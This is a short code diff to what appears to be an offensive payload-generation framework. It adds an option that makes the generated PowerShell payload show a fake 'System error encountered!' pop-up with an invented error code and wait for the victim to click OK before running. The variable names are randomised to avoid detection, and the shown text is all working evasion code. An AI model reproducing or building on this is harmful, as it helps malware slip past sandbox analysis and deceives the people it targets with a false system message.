@@ -413,6 +413,19 @@ def senecas_games(evasion_payload):
             check_code += "if ((New-Object DateTime(1900,1,1,0,0,0,[DateTimeKind]::Utc)).AddMilliseconds([UInt64]($runTotal*1000)).Second - $firstTime -ge " + evasion_payload.required_options["SLEEP"][0] + " -or $noAccess) {\n"
             num_tabs_required += 1
 
+        if evasion_payload.required_options["USERPROMPT"][0].lower() != "false":
+
+            dialog_title = evasion_helpers.randomString()
+            dialog_text = evasion_helpers.randomString()
+            message_box = evasion_helpers.randomString()
+
+            check_code += '$' + dialog_title + ' = "System error encountered!"\n'
+            check_code += '$' + dialog_text + ' = "Error 0x8163819f - Please hit OK to continue"\n'
+            check_code += '$' + message_box + ' = New-Object -COMObject WScript.Shell\n'
+            check_code += '[void]$' + message_box + '.Popup($' + dialog_text + ',0,$' + dialog_title + ',0)\n'
+            check_code += 'if ($true) {\n'
+            num_tabs_required += 1
+
         # Return check information
         return check_code, num_tabs_required
 
